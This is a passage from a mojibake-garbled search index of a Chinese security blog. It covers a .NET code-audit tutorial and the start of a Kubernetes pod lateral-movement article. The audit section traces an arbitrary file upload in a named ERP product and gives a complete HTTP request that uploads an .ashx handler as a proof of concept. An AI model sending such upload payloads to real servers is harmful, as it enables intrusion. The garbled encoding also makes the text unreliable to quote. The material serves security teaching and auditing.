33è¡Œfilenameå¯æ§ï¼Œè·Ÿè¿› ResponseFile å‡½æ•°ï¼š æœªå¯¹æ–‡ä»¶è·¯å¾„è¿›è¡Œè¿‡æ»¤ï¼Œç›´æ¥è¯»å–æ–‡ä»¶ å°†è¯»å–çš„æ–‡ä»¶æµå†™å…¥åˆ°HTTP Responseä¸­ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»ï¼š ä»£ç å®¡è®¡å…³æ³¨ç‚¹ï¼š File å¯¹è±¡çš„ OpenText å’Œ OpenRead æ–¹æ³• FileStream å¯¹è±¡çš„ FileMode.Open å’Œ FileMode.Read Response.WriteFile å¸¸ç”¨äºæ–‡ä»¶ä¸‹è½½ 5. æŸ¥æ‰¾ç¨‹åºå…¥å£ç‚¹ åœ¨ .NET Web é¡¹ç›®ä¸­ï¼Œå…¥å£ç‚¹æ˜¯ç¨‹åºå¼€å§‹æ‰§è¡Œçš„åœ°æ–¹ï¼Œç¡®å®šäº†åº”ç”¨ç¨‹åºçš„åˆå§‹åŒ–è¿‡ç¨‹ã€‚å…¥å£ç‚¹ä¼šå› é¡¹ç›®ç±»å‹çš„ä¸åŒè€Œæœ‰æ‰€ä¸åŒï¼Œä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ .NET Web é¡¹ç›®ç±»å‹åŠå…¶å…¥å£ç‚¹çš„æ¦‚è¿°ï¼š ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:9:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"ASP.NET Core é¡¹ç›® ASP.NET Core é¡¹ç›®çš„å…¥å£ç‚¹é€šå¸¸åœ¨ Program.cs æ–‡ä»¶ä¸­ã€‚è¯¥æ–‡ä»¶åŒ…å« Main æ–¹æ³•ï¼Œè¿™æ˜¯åº”ç”¨ç¨‹åºçš„å®é™…å…¥å£ã€‚ ç¤ºä¾‹ï¼š public class Program { public static void Main(string[] args) { CreateHostBuilder(args).Build().Run(); } public static IHostBuilder CreateHostBuilder(string[] args) =\u003e Host.CreateDefaultBuilder(args) .ConfigureWebHostDefaults(webBuilder =\u003e { webBuilder.UseStartup\u003cStartup\u003e(); }); } Main** æ–¹æ³•**ï¼šåº”ç”¨ç¨‹åºä»è¿™é‡Œå¼€å§‹æ‰§è¡Œã€‚CreateHostBuilder æ–¹æ³•ç”¨äºåˆ›å»ºå’Œé…ç½®åº”ç”¨ç¨‹åºçš„ä¸»æœºã€‚ Startup** ç±»**ï¼šæŒ‡å®šåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­è¦é…ç½®åº”ç”¨ç¨‹åºæœåŠ¡å’Œä¸­é—´ä»¶çš„ç±»ã€‚ ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:10:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"ASP.NET MVC é¡¹ç›® åœ¨ ASP.NET MVC é¡¹ç›®ä¸­ï¼Œå…¥å£ç‚¹ä½äº Global.asax.cs æ–‡ä»¶ä¸­ï¼Œé€šå¸¸æ˜¯ Application_Start æ–¹æ³•ã€‚ ç¤ºä¾‹ï¼š public class MvcApplication : System.Web.HttpApplication { protected void Application_Start() { AreaRegistration.RegisterAllAreas(); FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters); RouteConfig.RegisterRoutes(RouteTable.Routes); BundleConfig.RegisterBundles(BundleTable.Bundles); } } Application_Start** æ–¹æ³•**ï¼šè¿™æ˜¯ MVC åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ï¼Œå½“åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶ï¼ŒASP.NET ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œç”¨äºé…ç½®è·¯ç”±ã€è¿‡æ»¤å™¨ã€æ†ç»‘åŒ…ç­‰ã€‚ ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:11:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"ASP.NET Web Forms é¡¹ç›® ASP.NET Web Forms é¡¹ç›®çš„å…¥å£ç‚¹ä¹Ÿåœ¨ Global.asax.cs æ–‡ä»¶ä¸­ï¼ŒåŒæ ·ä½¿ç”¨ Application_Start æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ã€‚ ç¤ºä¾‹ï¼š public class Global : System.Web.HttpApplication { protected void Application_Start(object sender, EventArgs e) { // åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶çš„é…ç½®ä»£ç  } } 6. æŸ¥æ‰¾è·¯ç”± åœ¨ .NET Web é¡¹ç›®ä¸­ï¼Œè·¯ç”±å®šä¹‰äº† URL è¯·æ±‚å¦‚ä½•æ˜ å°„åˆ°ç‰¹å®šçš„æ§åˆ¶å™¨å’Œæ“ä½œæ–¹æ³•ï¼ˆæˆ–è€…å¤„ç†ç¨‹åºï¼‰ã€‚å½“ç¡®å®šäº†ç¨‹åºå…¥å£ç‚¹ï¼Œä»¥åŠå­˜åœ¨é£é™©çš„ä¸å®‰å…¨å‡½æ•°åï¼Œå¦‚ä½•è®¿é—®åˆ°å­˜åœ¨æ¼æ´çš„é¡µé¢å‘¢ï¼ŸWeb Forms é¡¹ç›®å¾ˆç®€å•ï¼Œç›´æ¥è®¿é—®å¯¹åº”çš„ xxx.aspx å³å¯ï¼Œå…¶å®ƒæ¶æ„ä¸‹å°±éœ€è¦å¯»æ‰¾å…¶è·¯ç”±å®šä¹‰ã€‚ ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:12:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"6.1. ASP.NET Core é¡¹ç›® ASP.NET Core ä½¿ç”¨ Startup.cs æ–‡ä»¶ä¸­çš„ Configure æ–¹æ³•æ¥é…ç½®è·¯ç”±ã€‚é€šå¸¸ä½ ä¼šçœ‹åˆ°ç±»ä¼¼å¦‚ä¸‹çš„ä»£ç ï¼š public void Configure(IApplicationBuilder app, IHostingEnvironment env) { app.UseRouting(); app.UseEndpoints(endpoints =\u003e { endpoints.MapControllerRoute( name: \"default\", pattern: \"{controller=Home}/{action=Index}/{id?}\"); }); } åœ¨è¿™é‡Œï¼ŒMapControllerRoute æ–¹æ³•å®šä¹‰äº†é»˜è®¤çš„è·¯ç”±æ¨¡å¼ï¼Œä½ å¯ä»¥åœ¨è¿™ä¸ª UseEndpoints æ–¹æ³•ä¸­æŸ¥çœ‹å’Œå®šä¹‰é¡¹ç›®çš„æ‰€æœ‰è·¯ç”±ã€‚ ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:13:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"6.2. ASP.NET MVC é¡¹ç›® åœ¨ ASP.NET MVC é¡¹ç›®ä¸­ï¼Œè·¯ç”±é€šå¸¸é…ç½®åœ¨ RouteConfig.cs æ–‡ä»¶ä¸­ï¼Œè¯¥æ–‡ä»¶ä½äº App_Start æ–‡ä»¶å¤¹ä¸‹ï¼š public class RouteConfig { public static void RegisterRoutes(RouteCollection routes) { routes.IgnoreRoute(\"{resource}.axd/{*pathInfo}\"); routes.MapRoute( name: \"Default\", url: \"{controller}/{action}/{id}\", defaults: new { controller = \"Home\", action = \"Index\", id = UrlParameter.Optional } ); } } 7. å®æˆ˜æŸERPé¡¹ç›® è¿™æ˜¯ä¸€å¥—å…¸å‹çš„MVCæ¶æ„ï¼Œé‡‡å–é¢„ç¼–è¯‘å½¢å¼ï¼ŒDLL æ–‡ä»¶å‡æ”¾ç½®åœ¨ bin ç›®å½•ä¸‹ï¼š é¦–å…ˆæ‹¿åˆ°é¡¹ç›®æºç æ—¶ï¼Œå…ˆå…³æ³¨å¦‚ä¸‹å‡ ä¸ªæ–‡ä»¶ï¼š Global.asaxï¼šç”¨äºå¤„ç†åº”ç”¨ç¨‹åºçº§åˆ«çš„äº‹ä»¶ï¼Œä¾‹å¦‚åº”ç”¨ç¨‹åºå¯åŠ¨ï¼ˆApplication_Startï¼‰ã€ä¼šè¯å¯åŠ¨ï¼ˆSession_Startï¼‰ã€åº”ç”¨ç¨‹åºé”™è¯¯ï¼ˆApplication_Errorï¼‰ç­‰ã€‚ Web.configï¼šASP.NET åº”ç”¨ç¨‹åºçš„ä¸»è¦é…ç½®æ–‡ä»¶ï¼Œç”¨äºå®šä¹‰åº”ç”¨ç¨‹åºçš„é…ç½®è®¾ç½®ï¼Œä¾‹å¦‚æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€èº«ä»½éªŒè¯æ–¹å¼ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ç­‰ã€‚ å…¶ä¸­ Global.asax å®šä¹‰äº†ç¨‹åºå…¥å£ç‚¹åœ¨ TraderXX.MvcApplicationç±»ä¸­ ä¸€èˆ¬æ¥è¯´ï¼ŒDLL æ–‡ä»¶åä¼šå¯¹åº”ä¸Šé¢ classçš„åç§°ï¼ˆæˆ–ç›¸è¿‘ï¼‰ï¼Œåœ¨ bin ä¸‹æ‰¾åˆ°å¯¹åº”çš„ DLL æ–‡ä»¶ï¼šTraderXX.dllï¼Œæ‹–å…¥ILSpyè¿›è¡Œåç¼–è¯‘ï¼š å¯»æ‰¾ MvcApplicationï¼Œåœ¨é‡Œé¢å®šä¹‰äº†ä¸€äº›åŸºç¡€è·¯ç”±ï¼š ç„¶åå¯»æ‰¾å­˜åœ¨é£é™©çš„å‡½æ•°ï¼Œè¿™é‡Œä»¥æ–‡ä»¶ä¸Šä¼ ä¸ºä¾‹ï¼Œæœç´¢ WriteAllBytes å…³é”®å­—ï¼š æœç´¢åˆ° EmailController ä¸‹å®šä¹‰äº† UploadEmailAttr actionï¼Œå…¶ä¸­ [ValidateInput(false)] [AcceptVerbs(HttpVerbs.Post)] [ValidateInput(false)]ï¼šç¦ç”¨è¯·æ±‚è¾“å…¥éªŒè¯ã€‚è¿™æ„å‘³ç€æ–¹æ³•ä¸ä¼šéªŒè¯è¾“å…¥æ•°æ®æ˜¯å¦åŒ…å«æ½œåœ¨çš„å±é™©å†…å®¹ï¼ˆä¾‹å¦‚ HTML æˆ–è„šæœ¬ï¼‰ã€‚è¿™é€šå¸¸åœ¨å¤„ç† HTML æˆ–å¯Œæ–‡æœ¬ç¼–è¾‘å™¨æ•°æ®æ—¶ä½¿ç”¨ï¼Œä½†ä¹Ÿå¯èƒ½ä¼šå¸¦æ¥å®‰å…¨é£é™©ï¼ˆå¦‚ XSS æ”»å‡»ï¼‰ï¼Œå› æ­¤éœ€è¦è°¨æ…ä½¿ç”¨ã€‚ [AcceptVerbs(HttpVerbs.Post)]ï¼šæŒ‡å®šè¯¥æ–¹æ³•åªæ¥å— HTTP POST è¯·æ±‚ã€‚è¿™è¡¨æ˜æ­¤æ–¹æ³•ä»…åœ¨å¤„ç†é€šè¿‡ POST æ–¹æ³•å‘é€çš„è¯·æ±‚æ—¶ä¼šè¢«è°ƒç”¨ã€‚ å¦‚ä¸‹è¿™ç§ï¼Œåˆ™æ˜¯éœ€è¦èº«ä»½è®¤è¯åæ‰å¯ä½¿ç”¨çš„ Actionï¼š è¿™ä¸€å—æœ‰ç‚¹ç±»ä¼¼äº Java çš„æ³¨è§£ï¼Œå®šä¹‰ä¸€äº›å…¨å±€å±æ€§ã€‚ Stream stream = new BufferedStream(base.Request.InputStream); byte[] array = new byte[stream.Length]; stream.Read(array, 0, array.Length); string joinfWebFileRootPath = base.JoinfWebFileRootPath; string text = joinfWebFileRootPath + \"temp\\\\emailatta\\\\\" + DateTime.Now.ToString(\"yyyyMM\") + \"\\\\\"; if (stream != null \u0026\u0026 stream.Length \u003e 0) { if (!Directory.Exists(text)) { Directory.CreateDirectory(text); } string text2 = CreateGUID(v_hasdate: true) + base.Request[\"name\"]; string text3 = text + text2; string text4 = text3.Replace(base.JoinfWebFileRootPath, base.JoinfWebFileRootUrl).Replace(\"\\\\\", \"/\"); string text5 = \"0\"; if (text2.ToLower().EndsWith(\".jpg\") || text2.ToLower().EndsWith(\".png\") || text2.ToLower().EndsWith(\".jpeg\") || text2.ToLower().EndsWith(\".gif\")) { text5 = \"1\"; } System.IO.File.WriteAllBytes(text3, array); return \"1|\" + text3.Replace(joinfWebFileRootPath, \"\") + \"|\" + text4 + \"|\" + text2 + \"|\" + text5; } æ¥ä¸‹æ¥çš„å‡½æ•°é€»è¾‘æ˜¯ä» HTTP Body ä¸­è¯»å–å†…å®¹ï¼Œè¯»å– HTTP name å‚æ•°ä½œä¸ºæ–‡ä»¶åç¼€ï¼Œè™½ç„¶æ£€æµ‹äº†æ–‡ä»¶åç¼€çš„å†…å®¹ï¼Œä½†æ˜¯å¹¶æœªåšæ‹¦æˆªå¤„ç†ï¼Œæœ€ç»ˆåˆ©ç”¨System.IO.File.WriteAllBytesç›´æ¥å†™å…¥åˆ°ç³»ç»Ÿä¸­ï¼Œå®ç°ä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚ æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾å…·ä½“çš„è·¯ç”±å®šä¹‰äº†ï¼Œç”±äºåœ¨å…¨å±€è·¯ç”±å¤„å¹¶æœªå®šä¹‰å…·ä½“çš„åŠŸèƒ½è·¯ç”±ï¼Œå› æ­¤æœç´¢ç›¸å…³å…³é”®å­—ï¼Œæ‰¾åˆ°åŒºåŸŸè·¯ç”±çš„å®šä¹‰ï¼š public class JoinfAppAreaRegistration : AreaRegistration è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªåä¸º JoinfAppAreaRegistration çš„ç±»ï¼Œå®ƒç»§æ‰¿è‡ª AreaRegistration ç±»ã€‚AreaRegistration æ˜¯ ASP.NET MVC ä¸­ç”¨äºæ³¨å†ŒåŒºåŸŸçš„åŸºç±»ã€‚ public override string AreaName =\u003e \"JoinfApp\"; è¯¥å±æ€§å®šä¹‰äº†åŒºåŸŸçš„åç§°ä¸º \"JoinfApp\"ã€‚è¿™ä¸ªåç§°ç”¨äºæ ‡è¯†å’Œè®¿é—®è¯¥åŒºåŸŸã€‚ public override void RegisterArea(AreaRegistrationContext context) RegisterArea æ–¹æ³•æ˜¯é‡å†™è‡ª AreaRegistration åŸºç±»çš„ä¸€ä¸ªæŠ½è±¡æ–¹æ³•ï¼Œç”¨äºæ³¨å†Œè¯¥åŒºåŸŸçš„è·¯ç”±ã€‚AreaRegistrationContext å‚æ•°æä¾›äº†å¯¹å½“å‰åŒºåŸŸè·¯ç”±çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚ context.MapRoute(\"Index\", \"JoinfApp/Index\", new { controller = \"Mobile\", action = \"Index\", AreaName = \"JoinfApp\" }); è¿™æ®µä»£ç ä¸ºè¯¥åŒºåŸŸå®šä¹‰äº†ä¸€ä¸ªåä¸º \"Index\" çš„è·¯ç”±ã€‚æ­¤è·¯ç”±å°† URL æ¨¡å¼ \"JoinfApp/Index\" æ˜ å°„åˆ° Mobile æ§åˆ¶å™¨çš„ Index æ“ä½œæ–¹æ³•ï¼Œå¹¶ä¸”å°† AreaName è®¾ç½®ä¸º \"JoinfApp\"ã€‚å…·ä½“æ¥è¯´ï¼š URL æ¨¡å¼ \"JoinfApp/Index\" å°†åŒ¹é…ç±»ä¼¼ http://xx/JoinfApp/Index çš„è¯·æ±‚ã€‚ è¯¥è¯·æ±‚å°†è¢«è·¯ç”±åˆ° MobileController çš„ Index æ–¹æ³•ã€‚ context.MapRoute(\"JoinfApp_default\", \"JoinfApp/{controller}/{action}/{id}\", new { action = \"Index\", id = UrlParameter.Optional }); æ­¤å¤„å®šä¹‰äº†ä¸€ä¸ªåä¸º \"JoinfApp_default\" çš„é»˜è®¤è·¯ç”±ï¼Œç”¨äºåŒ¹é…åŒºåŸŸå†…çš„å¤§å¤šæ•°è¯·æ±‚ã€‚å®ƒçš„ URL æ¨¡å¼æ˜¯ \"JoinfApp/{controller}/{action}/{id}\"ï¼Œè¯¥è·¯ç”±å¯ä»¥åŒ¹é…ç±»ä¼¼ http://xx/JoinfApp/ControllerName/ActionName/123 çš„è¯·æ±‚ã€‚ {controller} æ˜¯æ§åˆ¶å™¨åç§°çš„å ä½ç¬¦ã€‚ {action} æ˜¯æ“ä½œæ–¹æ³•åç§°çš„å ä½ç¬¦ï¼Œé»˜è®¤å€¼æ˜¯ \"Index\"ã€‚ {id} æ˜¯å¯é€‰çš„å‚æ•°ï¼Œé»˜è®¤ä¸ºç©ºã€‚ å› æ­¤ payload å‘¼ä¹‹æ¬²å‡º(å…¬å¼€æ¼æ´ï¼Œæ— é£é™©)ï¼š POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded \u003c% @ webhandler language=\"C#\" class=\"AverageHandler\" %\u003e using System; using System.Web; using System.IO; using System.Threading.Tasks; public class AverageHandler : IHttpHandler { public bool IsReusable { get { return false; } } public void ProcessRequest(HttpContext ctx) { ctx.Response.Write(\"POC_TEST\"); Task.Run(async () =\u003e { File.Delete(ctx.Server.MapPath(ctx.Request.FilePath)); }); ctx.Response.Flush(); ctx.Respo","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:14:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨ ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:0:0","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1 å‰è¨€ æœ¬æ–‡è®¨è®ºäº†æ¸—é€æµ‹è¯•åœºæ™¯ä¸‹ï¼Œå½“æ”»å‡»è€…åœ¨ Kubernetes é›†ç¾¤ä¸­æ‹¥æœ‰åˆ›å»º pods æƒé™æ—¶ï¼Œç”±äºé…ç½®ä¸å½“é€ æˆé›†ç¾¤æ¥ç®¡çš„é£é™©ã€‚æå‡ºåœ¨ä¸åŒé…ç½®ä¸‹ï¼Œé€šè¿‡ pods æ¨ªå‘ç§»åŠ¨å¹¶æœ€ç»ˆæ¥ç®¡é›†ç¾¤çš„ä¸åŒæ–¹æ¡ˆã€‚ ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:1:0","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2 æ‘˜è¦ æ ¹æ®å…¬å¸å®‰å…¨ä¸éšç§ä¿æŠ¤çš„è®¾è®¡è¦æ±‚ï¼Œä¸ºäº†ä¿è¯ç³»ç»Ÿçš„ä¿¡æ¯å®‰å…¨ï¼Œå…¶ä¸­ä¸€ä¸ªåŸåˆ™æ˜¯æœ€å°æƒé™åŸåˆ™ã€‚ä¹Ÿå°±æ˜¯æ¯ä¸ªç”¨æˆ·ã€ç³»ç»Ÿè¿›ç¨‹æˆ–åº”ç”¨ç¨‹åºéƒ½éœ€è¦ä½¿ç”¨å®Œæˆä»»åŠ¡æ‰€éœ€çš„æœ€å°‘æƒé™æ¥è¿è¡Œã€‚å¦‚æœæ‰€é…ç½®çš„æƒé™è¶…å‡ºäº†æ‰€éœ€çš„æƒé™ï¼Œæ”»å‡»è€…å°±ä¼šåˆ©ç”¨è¿™äº›åœºæ™¯è·å–æ•æ„Ÿæ•°æ®ã€å…¥ä¾µå…¶å®ƒç³»ç»Ÿæˆ–è¿›è¡Œæƒé™æå‡ï¼Œä»è€Œåœ¨å½“å‰ç½‘ç»œä¸­è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼ŒKubernetes çš„éƒ¨ç½²å’Œ DevOps çš„å®æ–½æµç¨‹æ¯”è¾ƒå¤æ‚ï¼Œåœ¨éƒ¨ç½²æ—¶ç”±äºè¿ç»´äººå‘˜çš„æ“ä½œï¼Œå¾€å¾€å¯¼è‡´é…ç½®é”™è¯¯æˆ–è¿èƒŒäº†â€œæœ€å°æƒé™åŸåˆ™â€ï¼Œæœ¬æ–‡æ€»ç»“äº†å¤šç§åœ¨çœŸå®åœºæ™¯ä¸‹ï¼Œå¦‚ä½•é€šè¿‡ä¸€äº›é…ç½®ä¸å½“çš„æƒé™ï¼Œç»•è¿‡å®‰å…¨æ£€æµ‹ï¼Œå®ç°æ¥ç®¡é›†ç¾¤çš„æ–¹æ³•ã€‚åŒæ—¶ï¼Œè¿ç»´äººå‘˜å¯ä»¥é€šè¿‡æœ¬æ–‡çš„æ¡ˆä¾‹ï¼Œæ£€æŸ¥ Kubernetes ä¸­çš„é…ç½®ï¼ŒåŠ å›ºç¯å¢ƒï¼Œä»è€Œé™ä½é›†ç¾¤å®‰å…¨é£é™©ã€‚ ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:2:0","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3 Kubernetes æä¾›çš„å®‰å…¨æ–¹æ¡ˆ æåŠåˆ° Kubernetes å®‰å…¨æœ€ä½³å®è·µï¼Œåœ¨é…ç½® pod æ—¶è¦ä½¿ç”¨æœ€å°ç‰¹æƒåŸåˆ™ã€‚ä½†æ˜¯ï¼Œè¯¥å¦‚ä½•æ‰§è¡Œç»†ç²’åº¦çš„å®‰å…¨æ§åˆ¶ï¼Œåˆè¯¥å¦‚ä½•è¯„ä¼°æ¯ä¸ªå±æ€§çš„é£é™©å‘¢ï¼ŸKubernetes æä¾›äº†å¤šç§æ–¹å¼æ¥è§£å†³ä¸Šé¢çš„é—®é¢˜ PodSecurityPolicy PodSecurityPolicy ä¸å…¶å®ƒä¸“é—¨çš„å‡†å…¥æ§åˆ¶æ’ä»¶ä¸€æ ·ï¼Œä½œä¸ºå†…ç½®çš„ç­–ç•¥ APIï¼ŒPodSecurityPolicyå¯ä»¥å¯¹Podçš„åˆ›å»ºæ›´æ–°è¿›è¡Œç»†ç²’åº¦çš„æˆæƒã€‚æ ¸å¿ƒæ˜¯é€šè¿‡å®šä¹‰ä¸€ç»„podåœ¨è¿è¡Œæ—¶å¿…é¡»éµå¾ªçš„æ¡ä»¶åŠç›¸å…³å­—æ®µçš„é»˜è®¤å€¼ï¼Œåªæœ‰Podæ»¡è¶³è¿™äº›æ¡ä»¶æ‰ä¼šè¢«K8sé›†ç¾¤æ‰€æ¥å—ã€‚ OPA Gatekeeper åœ¨Kubernetes v1.25 å¼€å§‹ï¼ŒPodSecurityPolicy (PSP) å‡†å…¥æ§åˆ¶å™¨å·²è¢«ç§»é™¤ã€‚OPAï¼ˆOpen Policy Agentï¼‰ï¼šæ˜¯ä¸€ä¸ªå¼€æºçš„ã€é€šç”¨ç­–ç•¥å¼•æ“ï¼Œå¯ä»¥å°†ç­–ç•¥ç¼–å†™ä¸ºä»£ç ã€‚æä¾›ä¸€ä¸ªç§é«˜çº§å£°æ˜æ€§è¯­è¨€æ¥ç¼–å†™ç­–ç•¥ï¼Œå¹¶æŠŠå†³ç­–è¿™ä¸€æ­¥éª¤ä»å¤æ‚çš„ä¸šåŠ¡é€»è¾‘ä¸­è§£è€¦å‡ºæ¥ã€‚Gatekeeper æ˜¯åŸºäº OPAçš„ä¸€ä¸ª Kubernetes ç­–ç•¥è§£å†³æ–¹æ¡ˆï¼Œå¯æ›¿ä»£PSPæˆ–è€…éƒ¨åˆ†RBACåŠŸèƒ½ã€‚å› ä¸ºOPAä¸Kuberneteså¯¹æ¥åå‘äºåº•å±‚ï¼Œä¸æ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨ï¼Œæ‰€ä»¥ç¤¾åŒºå°±åŸºäºOPAå¼•æ“å¼€å‘äº†OPA Gatekeeperçš„è§£å†³æ–¹æ¡ˆï¼Œæ–¹ä¾¿ä½¿ç”¨ã€‚å¦‚æœ pod æ‹¥æœ‰çš„æƒé™è¶…è¿‡äº†ç­–ç•¥å…è®¸çš„èŒƒå›´ï¼Œå‡†å…¥æ§åˆ¶å™¨å°±å¯ä»¥æ‹’ç»è¯¥ pod è¿›å…¥é›†ç¾¤ã€‚ ç„¶è€Œï¼Œå³ä½¿å­˜åœ¨ç”¨äºå®šä¹‰å’Œæ‰§è¡Œç­–ç•¥çš„æ§åˆ¶æªæ–½ï¼Œè¿ç»´äººå‘˜å¹¶ä¸æ€»èƒ½ç†è§£æ¯ä¸ªç‰¹å®šå±æ€§çš„å®é™…å®‰å…¨å½±å“ï¼Œè€Œä¸” pod çš„åˆ›å»ºå¾€å¾€æ²¡æœ‰æŒ‰éœ€è¦è¿›è¡Œé”å®šã€‚åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå½“è·å–çš„ shell åœ¨é›†ç¾¤çš„ podså†…ï¼Œä¸”æœ‰æƒé™åœ¨é›†ç¾¤ä¸Šåˆ›å»º podï¼Œè€Œé›†ç¾¤å´æ²¡æœ‰å¼ºåˆ¶æ‰§è¡Œç­–ç•¥ï¼Œè¿™ç§æƒ…æ™¯æ¥ç®¡é›†ç¾¤æ§åˆ¶æƒé™éå¸¸ç®€å•ã€‚ä½†æ˜¯ï¼Œå¦‚æœå½“å‰podsä¸‹åªå¯ä»¥ç”¨ hostNetworkã€hostPIDã€hostIPCã€hostPath æˆ– privileged åˆ›å»ºä¸€ä¸ª pod å‘¢ï¼Ÿé’ˆå¯¹ä¸åŒæƒ…æ™¯ï¼Œæœ¬æ–‡è®¨è®ºäº†ä¸åŒçš„æ¥ç®¡æ–¹æ¡ˆã€‚ ğŸ’­å„ç§æƒé™çš„æ¦‚å¿µï¼š privilegedï¼šç‰¹æƒå®¹å™¨æ˜¯ä¸€ç§å…·æœ‰ä¸»æœºçš„æ‰€æœ‰åŠŸèƒ½çš„å®¹å™¨ï¼Œå®ƒè§£é™¤äº†å¸¸è§„å®¹å™¨çš„æ‰€æœ‰é™åˆ¶ã€‚ç‰¹æƒå®¹å™¨å¯ä»¥æ‰§è¡Œå‡ ä¹æ‰€æœ‰å¯ä»¥ç›´æ¥åœ¨ä¸»æœºä¸Šæ‰§è¡Œçš„æ“ä½œï¼ŒåŒ…æ‹¬ä¸€äº›é’ˆå¯¹å†…æ ¸ä¿®æ”¹çš„æ“ä½œç­‰ã€‚æ¯”å¦‚ï¼šcalico 